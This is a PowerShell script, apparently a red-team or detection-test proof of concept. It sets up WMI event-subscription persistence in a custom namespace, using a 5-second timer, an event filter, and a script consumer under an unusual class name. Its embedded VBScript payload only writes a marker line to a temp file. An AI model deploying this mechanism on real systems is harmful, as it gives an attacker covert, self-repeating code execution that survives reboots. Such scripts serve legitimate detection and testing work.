$TargetNamespace = 'root/Foo'

$VBScriptPayload = @"
Option Explicit

Dim strUser, strFileTargetPath, objFSOTarget, fso, objFilesTarget

strUser = CreateObject("WScript.Network").UserName

strFileTargetPath = "C:\Windows\Temp\wmifiledrop.txt"

Set objFSOTarget = CreateObject("scripting.filesystemobject")

Set objFilesTarget = objFSOTarget.OpenTextFile(strFileTargetPath,8,True,0) 
Set fso = CreateObject("Scripting.FileSystemObject")

objFilesTarget.WriteLine "Payload executed as " & strUser & " at: " & now

objFilesTarget.Close
"@

$TimerArgs = @{
    IntervalBetweenEvents = ([UInt32] 5000) # Trigger every 5 seconds
    SkipIfPassed = $False
    TimerId = 'PayloadTrigger'
}

$Timer = New-CimInstance -Namespace $TargetNamespace -Class __IntervalTimerInstruction -Arguments $TimerArgs

$EventFilterArgs = @{
    EventNamespace = $TargetNamespace
    Name = 'TimerTrigger'
    Query = 'SELECT * FROM __TimerEvent WHERE TimerID = "PayloadTrigger"'
    QueryLanguage = 'WQL'
}

$Filter = New-CimInstance -Namespace $TargetNamespace -ClassName __EventFilter -Property $EventFilterArgs

$ActiveScriptEventConsumerArgs = @{
    Name = 'ExecuteFileDropper'
    ScriptingEngine = 'VBScript'
    ScriptText = $VBScriptPayload
    KillTimeout = [UInt32] 45
}

$Consumer = New-CimInstance -Namespace $TargetNamespace -ClassName NotAnActiveScriptEventConsumer -Property $ActiveScriptEventConsumerArgs

$Consumer

$FilterToConsumerArgs = @{
    Filter = [Ref] $Filter
    Consumer = [Ref] $Consumer
}

$FilterToConsumerBinding = New-CimInstance -Namespace $TargetNamespace -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs

